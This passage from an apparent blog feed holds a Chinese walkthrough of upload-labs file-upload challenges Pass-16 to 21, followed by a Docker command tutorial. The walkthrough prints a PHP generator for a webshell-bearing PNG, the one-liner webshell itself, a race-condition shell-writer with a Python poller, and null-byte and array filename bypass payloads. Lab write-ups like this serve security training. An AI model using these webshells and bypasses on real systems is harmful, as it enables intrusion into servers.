+    if(!$res){
+        $msg = &quot;文件未知，上传失败！&quot;;
+    }else{
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+    }
+}
+</code></pre>
+<blockquote>
+<p>这题还是用Pass-15的gif马,一模一样的流程</p>
+</blockquote>
+<br>
+<h2 id="pass-17">Pass-17</h2>
+<blockquote>
+<p>本pass重新渲染了图片！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])){
+    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
+    $filename = $_FILES['upload_file']['name'];
+    $filetype = $_FILES['upload_file']['type'];
+    $tmpname = $_FILES['upload_file']['tmp_name'];
+
+    $target_path=UPLOAD_PATH.'/'.basename($filename);
+
+    // 获得上传文件的扩展名
+    $fileext= substr(strrchr($filename,&quot;.&quot;),1);
+
+    //判断文件后缀与类型，合法才进行上传操作
+    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
+        if(move_uploaded_file($tmpname,$target_path)){
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromjpeg($target_path);
+
+            if($im == false){
+                $msg = &quot;该文件不是jpg格式的图片！&quot;;
+                @unlink($target_path);
+            }else{
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.jpg&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.'/'.$newfilename;
+                imagejpeg($im,$img_path);
+                @unlink($target_path);
+                $is_upload = true;
+            }
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+
+    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
+        if(move_uploaded_file($tmpname,$target_path)){
+            //使用上传的图片生成新的图片
+            $im = imagecreatefrompng($target_path);
+
+            if($im == false){
+                $msg = &quot;该文件不是png格式的图片！&quot;;
+                @unlink($target_path);
+            }else{
+                 //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.png&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.'/'.$newfilename;
+                imagepng($im,$img_path);
+
+                @unlink($target_path);
+                $is_upload = true;               
+            }
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+
+    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
+        if(move_uploaded_file($tmpname,$target_path)){
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromgif($target_path);
+            if($im == false){
+                $msg = &quot;该文件不是gif格式的图片！&quot;;
+                @unlink($target_path);
+            }else{
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.gif&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.'/'.$newfilename;
+                imagegif($im,$img_path);
+
+                @unlink($target_path);
+                $is_upload = true;
+            }
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+    }else{
+        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
+    }
+}
+</code></pre>
+<h4 id="二次渲染绕过">二次渲染绕过</h4>
+<blockquote>
+<p>二次渲染绕过介绍https://xz.aliyun.com/t/2657</p>
+</blockquote>
+<h3 id="编写脚本">编写脚本</h3>
+<blockquote>
+<p>需要linux环境,实测Windows跑出来的文件没有关键代码</p>
+</blockquote>
+<pre><code class="language-php">新建一个payload.php文件
+
+&lt;?php
+//png.php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0xe, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x1, 0xdc, 0x5a, 0x1, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);
+$img = imagecreatetruecolor(32, 32);
+for ($y = 0; $y &lt; sizeof($p); $y += 3) {
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+}
+imagepng($img,'./payload.png');
+?&gt;
+
+准备一张png图片
+
+执行命令
+php payload.php 1.png
+得到一张payload.png
+    
+里面包含一句话木马
+&lt;?=$_GET[0]($_POST[1]);?&gt;
+</code></pre>
+<h3 id="文件包含-3">文件包含</h3>
+<p>使用include.php包含上传的图片,使用AntSword连接一句话木马即可</p>
+<br>
+<h2 id="pass-18">Pass-18</h2>
+<blockquote>
+<p>需要代码审计！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+
+if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');
+    $file_name = $_FILES['upload_file']['name'];
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
+    $upload_file = UPLOAD_PATH . '/' . $file_name;
+
+    if(move_uploaded_file($temp_file, $upload_file)){
+        if(in_array($file_ext,$ext_arr)){
+             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+             rename($upload_file, $img_path);
+             $is_upload = true;
+        }else{
+            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+            unlink($upload_file);
+        }
+    }else{
+        $msg = '上传出错！';
+    }
+}
+</code></pre>
+<h3 id="条件竞争漏洞">条件竞争漏洞</h3>
+<p>这里先是上传文件临时保存,接着进行文件类型判断,如果白名单不存在就删除文件,如果白名单存在就重命名文件保存,所以这里存在条件竞争</p>
+<h3 id="复现漏洞">复现漏洞</h3>
+<p>新建一个php_payload.php文件</p>
+<pre><code class="language-php">&lt;?php
+	fputs(fopen('shell.php','w'),'&lt;?php phpinfo();?&gt;');
+?&gt;
+</code></pre>
+<p>新建一个python_payload.py</p>
+<pre><code class="language-python">import requests
+def main():
+    i=0
+    while 1:
+        try:
+            a=requests.get(&quot;http://192.168.78.101/upload/upload/php_payload.php&quot;)
+            if a.status_code==200:
+                print(&quot;ok&quot;)
+                break
+        except Exception as e:
+            pass
+        print(i)
+        i+=1
+
+if __name__=='__main__':
+    main()
+</code></pre>
+<p>抓包Ctrl+i,送入测试器,调整参数:位置-&gt;$清楚,有效负债-&gt;没有负债,无限期地重复,选项-&gt;线程数20</p>
+<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-18Burp%E6%B5%8B%E8%AF%95%E5%99%A8.gif" alt="" loading="lazy"></figure>
+<p>执行python脚本,直至输入OK(尽量多试几次,有时候返回ok,结果没有生成文件)</p>
+<p>访问<code>http://192.168.78.101/upload/upload/shell.php</code>,如果访问错误,请多次尝试复现漏洞</p>
+<br>
+<h2 id="pass-19">Pass-19</h2>
+<blockquote>
+<p>需要代码审计！</p>
+</blockquote>
+<pre><code class="language-php">//index.php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit']))
+{
+    require_once(&quot;./myupload.php&quot;);
+    $imgFileName =time();
+    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
+    $status_code = $u-&gt;upload(UPLOAD_PATH);
+    switch ($status_code) {
+        case 1:
+            $is_upload = true;
+            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;
+            break;
+        case 2:
+            $msg = '文件已经被上传，但没有重命名。';
+            break; 
+        case -1:
+            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
+            break; 
+        case -2:
+            $msg = '上传失败，上传目录不可写。';
+            break; 
+        case -3:
+            $msg = '上传失败，无法上传该类型文件。';
+            break; 
+        case -4:
+            $msg = '上传失败，上传的文件过大。';
+            break; 
+        case -5:
+            $msg = '上传失败，服务器已经存在相同名称文件。';
+            break; 
+        case -6:
+            $msg = '文件无法上传，文件不能复制到目标目录。';
+            break;      
+        default:
+            $msg = '未知错误！';
+            break;
+    }
+}
+
+//myupload.php
+class MyUpload{
+......
+......
+...... 
+  var $cls_arr_ext_accepted = array(
+      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,
+      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );
+
+......
+......
+......  
+  /** upload()
+   **
+   ** Method to upload the file.
+   ** This is the only method to call outside the class.
+   ** @para String name of directory we upload to
+   ** @returns void
+  **/
+  function upload( $dir ){
+    
+    $ret = $this-&gt;isUploadedFile();
+    
+    if( $ret != 1 ){
+      return $this-&gt;resultUpload( $ret );
+    }
+
+    $ret = $this-&gt;setDir( $dir );
+    if( $ret != 1 ){
+      return $this-&gt;resultUpload( $ret );
+    }
+
+    $ret = $this-&gt;checkExtension();
+    if( $ret != 1 ){
+      return $this-&gt;resultUpload( $ret );
+    }
+
+    $ret = $this-&gt;checkSize();
+    if( $ret != 1 ){
+      return $this-&gt;resultUpload( $ret );    
+    }
+    
+    // if flag to check if the file exists is set to 1
+    
+    if( $this-&gt;cls_file_exists == 1 ){
+      
+      $ret = $this-&gt;checkFileExists();
+      if( $ret != 1 ){
+        return $this-&gt;resultUpload( $ret );    
+      }
+    }
+
+    // if we are here, we are ready to move the file to destination
+
+    $ret = $this-&gt;move();
+    if( $ret != 1 ){
+      return $this-&gt;resultUpload( $ret );    
+    }
+
+    // check if we need to rename the file
+
+    if( $this-&gt;cls_rename_file == 1 ){
+      $ret = $this-&gt;renameFile();
+      if( $ret != 1 ){
+        return $this-&gt;resultUpload( $ret );    
+      }
+    }
+    
+    // if we are here, everything worked as planned :)
+
+    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );
+  
+  }
+......
+......
+...... 
+};
+</code></pre>
+<blockquote>
+<p>本题需要Apache+PHP的环境,Nginx+PHP无法复现</p>
+</blockquote>
+<h3 id="条件竞争漏洞-2">条件竞争漏洞</h3>
+<p>本题依然是文件上传先临时保存,然后在修改文件名,只要文件上传够快,php重命名就会来不及,所以存在条件竞争,且需要结合Apache未知后缀解析漏洞</p>
+<h3 id="复现漏洞-2">复现漏洞</h3>
+<p>依旧使用Pass-18的payload.php的代码,并重命名为php_payload.php.7z</p>
+<p>Python脚本也是用Pass-18的,且请求的Url里的文件名改为php_payload.php.7z</p>
+<p>不知道是不是环境问题,我测试的时候文件上传的Url为:</p>
+<p><code>http://192.168.78.101/upload/uploadphp_payload.php.7z</code>upload和php_payload.php.7z之间少了条反斜杠,所以python的请求的Url为:</p>
+<p><code>http://192.168.78.101/upload/upload/php_payload.php.7z</code></p>
+<p><code>大家根据自己环境进行修改</code></p>
+<br>
+<h2 id="pass-20">Pass-20</h2>
+<blockquote>
+<p>本pass的取文件名通过$_POST来获取。</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+        $file_name = $_POST['save_name'];
+        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+
+        if(!in_array($file_ext,$deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) { 
+                $is_upload = true;
+            }else{
+                $msg = '上传出错！';
+            }
+        }else{
+            $msg = '禁止保存为该类型文件！';
+        }
+
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<h3 id="00截断与绕过">00截断与/.绕过</h3>
+<p>由于文件上传后,通过POST将文件名传递,所以可以在move_uploaded_file来绕过黑名单</p>
+<pre><code class="language-powershell">payload1:
+	upload-19.jpg -&gt; upload-19.php%00
+	由于是POST所以需要像Pass-13一样需要手动进行urldecode
+payload2:
+	upload-19.jpg -&gt; upload-19/.
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-20burp%E6%8A%93%E5%8C%851.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="22"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-20burp%E6%8A%93%E5%8C%852.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="pass-21">Pass-21</h2>
+<blockquote>
+<p>Pass-20来源于CTF，请审计代码！(😅都更新21题了,提示还不改😅)</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if(!empty($_FILES['upload_file'])){
+    //检查MIME
+    $allow_type = array('image/jpeg','image/png','image/gif');
+    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
+        $msg = &quot;禁止上传该类型文件!&quot;;
+    }else{
+        //检查文件名
+        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
+        if (!is_array($file)) {
+            $file = explode('.', strtolower($file));
+        }
+
+        $ext = end($file);
+        $allow_suffix = array('jpg','png','gif');
+        if (!in_array($ext, $allow_suffix)) {
+            $msg = &quot;禁止上传该后缀文件!&quot;;
+        }else{
+            $file_name = reset($file) . '.' . $file[count($file) - 1];
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $msg = &quot;文件上传成功！&quot;;
+                $is_upload = true;
+            } else {
+                $msg = &quot;文件上传失败！&quot;;
+            }
+        }
+    }
+}else{
+    $msg = &quot;请选择要上传的文件！&quot;;
+}
+</code></pre>
+<h3 id="数组绕过">数组/绕过</h3>
+<p><code>$file_name</code>经过<code>reset($file) . '.' . $file[count($file) - 1];</code>处理。</p>
+<p>如果上传的是数组的话，会跳过<code>$file = explode('.', strtolower($file));</code>。并且后缀有白名单过滤,而最终的文件名后缀取的是<code>$file[count($file) - 1]</code>，因此我们可以让<code>$file</code>为数组。<code>$file[0]</code>为<code>upload-29.php/</code>，也就是<code>reset($file)</code>，然后再令<code>$file[2]</code>为白名单中的jpg。此时<code>end($file)</code>等于jpg，<code>$file[count($file) - 1]</code>为空。而 <code>$file_name = reset($file) . '.' . $file[count($file) - 1];</code>，也就是<code>upload-29.php/.</code>，最终<code>move_uploaded_file</code>会忽略掉<code>/.</code>，最终上传<code>upload-29.php</code>。</p>
+<figure data-type="image" tabindex="23"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-21burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="文件上传漏洞分析流程">文件上传漏洞分析流程</h2>
+<figure data-type="image" tabindex="24"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Docker保姆级教程 : Docker 命令手册]]></title>
+        <id>https://M0kY4n.github.io111/post/docker-ming-ling-shou-ce/</id>
+        <link href="https://M0kY4n.github.io111/post/docker-ming-ling-shou-ce/">
+        </link>
+        <updated>2020-07-17T03:12:21.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="docker命令笔记">Docker命令笔记</h1>
+<br>
+<h2 id="docker-学习资源">Docker 学习资源</h2>
+<blockquote>
+<p>Docker官方命令手册 :https://docs.docker.com/reference/</p>
+<p>菜鸟教程命令手册:https://www.runoob.com/docker/docker-command-manual.html</p>
+<p>B站<a href="https://space.bilibili.com/95256449">遇见狂神说</a>UP主视频教学:https://www.bilibili.com/video/BV1og4y1q7M4</p>
+</blockquote>
+<br>
+<br>
+<h2 id="docker镜像命令">Docker镜像命令</h2>
+<br>
+<h3 id="docker-images查看本地镜像">docker images	查看本地镜像</h3>
+<pre><code class="language-shell">docker images [OPTIONS] [REPOSITORY[:TAG]]
+-a	列出本地所有镜像
+-q	列出本地所有镜像且只显示IMAGE ID
+
+docker images -a
+
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+hello-world         latest              bf756fb1ae65        5 months ago        13.3kB
+
+docker images -a
+bf756fb1ae65
+
+docker images hello-world
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+hello-world         latest              bf756fb1ae65        5 months ago        13.3kB
+
+#参数说明
+REPOSITORY			镜像的名字
+TAG					镜像的标签
+IMAGE ID			镜像的ID值
+CREATED				镜像的创建时间
+SIZE				镜像的大小
+
+</code></pre>
+<br>
+<h3 id="docker-search从docker-hub查找镜像">docker search	从Docker Hub查找镜像</h3>
+<blockquote>
+<p>Docker Hub地址:https://hub.docker.com/</p>
+</blockquote>
+<p>从Docker Hub中搜索mysql的结果</p>
+<figure data-type="image" tabindex="1"><img src="https://file.moetu.org/images/2020/07/17/image-2020062415532498204635e27e999eaab.png" alt="image-2020062415532498204635e27e999eaab.png" loading="lazy"></figure>
+<p>通过docker search搜索mysql的结果</p>
+<pre><code class="language-shell">
+docker search mysql
+
+NAME         		DESCRIPTION            			STARS       OFFICIAL        AUTOMATED
+mysql        		MySQL is a widely used...   	9666        [OK]                
+mariadb      		MariaDB is a community-devel.. 	3517      	[OK]                
+mysql/mysql-server  Optimized MySQL Server Docker.. 705                         [OK]
+centos/mysql-57-... MySQL 5.7 SQL database server   77                                      
+
+#通过--filter筛选结果
+docker search mysql --filter=STARS=3000
+NAME         		DESCRIPTION            			STARS       OFFICIAL        AUTOMATED
+mysql        		MySQL is a widely used...   	9666        [OK]                
+mariadb      		MariaDB is a community-devel.. 	3517      	[OK]                
+
+#参数说明
+NAME				镜像的名字
+DESCRIPTION			镜像的描述
+STARS				类似于GitHub里面的star,表示点赞,喜欢
+OFFICIAL			是否为docker官方发布
+AUTOMATED			是否自动搭建
+
+</code></pre>
+<br>
+<h3 id="docker-pull-从docker-hub下载镜像">docker pull 从Docker Hub下载镜像</h3>
+<pre><code class="language-shell">docker pull [OPTIONS] NAME[:TAG|@DIGEST]
+-a	拉取所有包含[NAME]的镜像
+
+#默认下载最新版
+docker pull mysql
+
+Using default tag: latest
+latest: Pulling from library/mysql
+8559a31e96f4: Pull complete 
+d51ce1c2e575: Pull complete 
+c2344adc4858: Pull complete 
+fcf3ceff18fc: Pull complete 
+16da0c38dc5b: Pull complete 
+b905d1797e97: Pull complete 
+4b50d1c6b05c: Pull complete 
+c75914a65ca2: Pull complete 
+1ae8042bdd09: Pull complete 
+453ac13c00a3: Pull complete 
+9e680cd72f08: Pull complete 
+a6b5dc864b6c: Pull complete 
+Digest: sha256:8b7b328a7ff6de46ef96bcf83af048cb00a1c86282bfca0cb119c84568b4caf6
+Status: Downloaded newer image for mysql:latest
+docker.io/library/mysql:latest
+
+#指定版本下载,版本必须在Docker Hub存在
+docker pull mysql:8.0
+8.0: Pulling from library/mysql
+Digest: sha256:8b7b328a7ff6de46ef96bcf83af048cb00a1c86282bfca0cb119c84568b4caf6
+Status: Downloaded newer image for mysql:8.0
+docker.io/library/mysql:8.0
+
+#从镜像库拉取所有tag标签名的镜像
+docker pull mysql -a
+#结果太多了,直接看本地镜像
+docker images
+
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+mysql               8.0                 be0dbf01a0f3        2 weeks ago         541MB
+mysql               latest              be0dbf01a0f3        2 weeks ago         541MB
+mysql               5.5                 d404d78aa797        13 months ago       205MB
+mysql               5.5.62              d404d78aa797        13 months ago       205MB
+mysql               5.6.43              bc788a6a2745        15 months ago       256MB
+mysql               5.6.42              27e29668a08a        18 months ago       256MB
+mysql               5.5.61              d306c8812ec3        20 months ago       205MB
+mysql               5.6.41              085b9b6ec8a9        20 months ago       256MB
+mysql               5.5.60              2cd7ceff3e53        23 months ago       205MB
+mysql               5.6.40              50328380b2b4        23 months ago       256MB
+mysql               5.5.59              0da48351c371        2 years ago         205MB
+mysql               5.6.39              079344ce5ebd        2 years ago         256MB
+...
+
+</code></pre>
+<br>
+<h3 id="docker-rmi删除本地镜像">docker rmi	删除本地镜像</h3>
+<pre><code class="language-shell">docker rmi [OPTIONS] IMAGE [IMAGE...]
+-f	强制删除
+
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+mysql               latest              be0dbf01a0f3        2 weeks ago         541MB
+hello-world         latest              bf756fb1ae65        5 months ago        13.3kB
+
+#卸载本地镜像的mysql
+docker rmi -f be0dbf01a0f3
+docker rmi -f mysql
+
+#卸载本地所有镜像(一个一个删除)
+docker rmi -f mysql hello-world
+docker rmi -f be0dbf01a0f3 bf756fb1ae65
+
+#卸载本地所有镜像(通过$()传值删除)
+docker rmi -f $(docker images -aq)
+
+</code></pre>
+<br>
+<h2 id="docker容器命令">Docker容器命令</h2>
+<br>
+<br>
+<h3 id="docker-run新建容器并启动">docker run	新建容器并启动</h3>
+<pre><code class="language-shell">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]
+--name=&quot;Name&quot;	为容器指定一个名称
+-d				后台运行容器,并返回容器id
+--it			以交互模式运行容器,为容器分配一个伪输入终端
+-p				(小写p)指定容器的端口	格式为 -p 8080(宿主机端口):8080(容器端口)
+-P				(大写p)随机指定端口
+-v				挂载目录				格式为 -v /home/user(宿主机目录):/root/user(容器目录)
+							
+							匿名挂载 -v	容器内路径			  	 
+							具名挂载 -v	卷名:容器内路径			
+							指定路径挂载 -v	宿主机路径:容器内路径
+							
+							只读	在容器内路径后面加 &quot;:ro&quot;
+							读写  在容器内路径后面加 &quot;:rw&quot;
+-e				环境配置
+--volumes-from	从另一个容器当中挂载容器中已经创建好的数据卷
+							docker run -it --name docker02 --volumes-from docker01 centos
+							运行容器docker02挂载到容器docker01上,实现更新数据在容器之间共享
+
+#docker容器使用后台运行,就必须要有一个前台进程,否则docker发现没有应用就会停止容器
+</code></pre>
+<br>
+<h3 id="docker-ps列出正在运行的容器信息">docker ps	列出正在运行的容器信息</h3>
+<pre><code class="language-shell">docker ps [OPTIONS]
+-a		显示所有容器,包括历史容器
+-n=Num	显示最近创建的&quot;n&quot;个容器
+-q		显示容器的ID
+
+</code></pre>
+<br>
+<h3 id="docker退出容器">docker退出容器</h3>
+<pre><code class="language-shell">exit			#终止并退出容器
+Ctrl + P + Q	#不终止并退出容器
+
+</code></pre>
+<br>
+<h3 id="docker-rm删除容器">docker rm	删除容器</h3>
+<pre><code class="language-shell">docker rm [OPTIONS] CONTAINER [CONTAINER...]
+-f		#强制删除一个运行中的容器
+
+#删除容器
+docker rm -f 8c7fefd9e698
+
+#删除所有容器
+docker rm -f $(docker ps -aq)
+docker ps -a -q | xargs docker rm -f
+
+</code></pre>
+<br>
+<h3 id="docker-startstoprestartkill启动停止重启杀掉容器">docker start/stop/restart/kill		启动/停止/重启/杀掉容器</h3>
+<pre><code class="language-shell">docker start CONTAINER		:启动容器
+docker stop CONTAINER		:停止容器
+docker restart CONTAINER	:重启容器
+docker kill CONTAINER		:杀掉容器
+
+</code></pre>
+<br>
+<h3 id="docker-logs获取容器的日志">docker logs		获取容器的日志</h3>
+<pre><code class="language-sh">docker logs [OPTIONS] CONTAINER
+-f			跟踪日志输出
+-t			显示时间戳
+--tail Num	列出最新Num调容器日志
+</code></pre>
+<br>
+<h3 id="docker-top查看容器中运行的进程信息">Docker top		查看容器中运行的进程信息</h3>
+<pre><code class="language-shell">docker top [OPTIONS] CONTAINER [ps OPTIONS]
+</code></pre>
+<br>
+<h3 id="docker-inspect获取容器镜像的元数据">docker inspect		获取容器/镜像的元数据</h3>
+<pre><code class="language-shell">docker inspect [OPTIONS] NAME|ID [NAME|ID...]
+
+#查看centos的元数据
+docker inspect centos
+[
+    {
+        &quot;Id&quot;: &quot;sha256:831691599b88ad6cc2a4abbd0e89661a121aff14cfa289ad840fd3946f274f1f&quot;,
+        &quot;RepoTags&quot;: [
+            &quot;centos:latest&quot;
+        ],
+        &quot;RepoDigests&quot;: [
+            &quot;centos@sha256:4062bbdd1bb0801b0aa38e0f83dece70fb7a5e9bce223423a68de2d8b784b43b&quot;
+        ],
+...
+</code></pre>
+<br>
+<h3 id="docker-exec进入已经运行的容器重新分配终端">Docker exec		进入已经运行的容器(重新分配终端)</h3>
+<pre><code class="language-shell">docker exec [OPTIONS] CONTAINER COMMAND [ARG...]
+--it			以交互模式运行容器,为容器分配一个伪输入终端
+
+#进入正在运行的Centos容器
+docker exec -it 336cc1fb92bf /bin/bash
+
+
+</code></pre>
+<br>
+<h3 id="docker-attach连接到正在运行中的容器">Docker attach		连接到正在运行中的容器</h3>
+<pre><code class="language-shell">docker attach [OPTIONS] CONTAINER
+
+#进入正在运行的Centos容器
+docker attach 336cc1fb92bf
+</code></pre>
+<br>
+<h3 id="docker-cp-容器与主机之间数据拷贝">Docker cp 		容器与主机之间数据拷贝</h3>
+<pre><code class="language-shell">docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-
+
+
+docker cp 336cc1fb92bf:/home/test.txt /
+将容器里的/home/test.txt 拷贝到 宿主机的/目录上
+</code></pre>
+<br>
+<h3 id="docker-commit从容器创建一个新的镜像">Docker commit		从容器创建一个新的镜像</h3>
+<pre><code class="language-shell">docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]
+-m :提交时的说明文字；
+-a :提交的镜像作者；
+
+创建一个镜像
+docker commit -a=&quot;MokYan&quot; -m=&quot;add webapps app&quot; c97729657a71 tomcat-v1:1.0
+
+docker images
+
+REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
+tomcat-v1             1.0              	  366d86150b16        19 seconds ago      652MB
+tomcat                latest              6055d4d564e1        3 days ago          647MB
+
+</code></pre>
+<br>
+<h2 id="docker-数据命令">Docker 数据命令</h2>
+<br>
+<br>
+<h3 id="docker-volume管理docker容器挂载的卷">docker volume		管理docker容器挂载的卷</h3>
+<pre><code class="language-shell">Usage:	docker volume COMMAND
+
+Commands:
+  create      创建一个 volume
+  inspect     查看一个或多个volume 的元数据
+  ls          查看 volumes
+  prune       删除所有未使用的本地 volumes
+  rm          移出一个或多个 volumes
+  
+
+</code></pre>
+<ul>
+<li>docker 默认在主机上会有一个特定的区域（<code>/var/lib/docker/volumes/</code>），该区域用来存放 volume。</li>
+<li>非 docker 进程不应该去修改该区域。</li>
+<li>volume 可以通过 <code>docker volume</code> 进行管理，如创建、删除等操作。</li>
+<li>volume 在生成的时候如果不指定名称，便会随机生成。</li>
+</ul>
+<br>
+<h3 id="docker-file">docker file</h3>
+<pre><code class="language-shell">使用 Dockerfile 定制镜像
+
+1.	创建Docker file文件(名字随意)
+	vim dockerfile1
+	
+2.	编辑docker file文件
+	FROM centos
+	VOLUME [&quot;volume01&quot;,&quot;volume02&quot;]
+	CMD echo &quot;----end----&quot;
+	CMD /bin/bash
+
+3.	构建镜像
+	docker build -f /home/docker-test-volume/dockerfile1 -t mokyan/centos:1.0 .
+	Sending build context to Docker daemon  2.048kB
+    Step 1/4 : FROM centos
+     ---&gt; 831691599b88
+    Step 2/4 : VOLUME [&quot;volume01&quot;,&quot;volume02&quot;]
+     ---&gt; Running in 7aa721724f47
+    Removing intermediate container 7aa721724f47
+     ---&gt; 37cc8ddeb5ef
+    Step 3/4 : CMD echo &quot;----end----&quot;
+     ---&gt; Running in a00fd1594c00
+    Removing intermediate container a00fd1594c00
+     ---&gt; 976fefd5e341
+    Step 4/4 : CMD /bin/bash
+     ---&gt; Running in 3203befb485f
+    Removing intermediate container 3203befb485f
+     ---&gt; e03ef3a4bf68
+    Successfully built e03ef3a4bf68
+    Successfully tagged mokyan/centos:1.0
+    
+4.	查看镜像
+	docker images
+	REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
+	mokyan/centos         1.0                 e03ef3a4bf68        16 seconds ago      215MB
+
+注意:
+	编辑docker file文件,里面的命令都是大写的
+	构建镜像时,最后的点是上下文路径,所以上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。
+	构建镜像时,-t后面接的名字不能存在大写,否则会报错
+	构建镜像时,&quot;#&quot;表示注释
+
+</code></pre>
+<br>
+<h3 id="docker-file-指令">docker file 指令</h3>
+<pre><code class="language-shell">FROM			#基础镜像,基于这个镜像构建
+MAINTAINER		#构建镜像的作者信息
+RUN				#镜像构建时需要运行的命令
+ADD				#添加内容
+WORKDIR			#镜像的工作目录
+VOLUME			#挂载的目录
+EXPOSE			#暴露端口配置
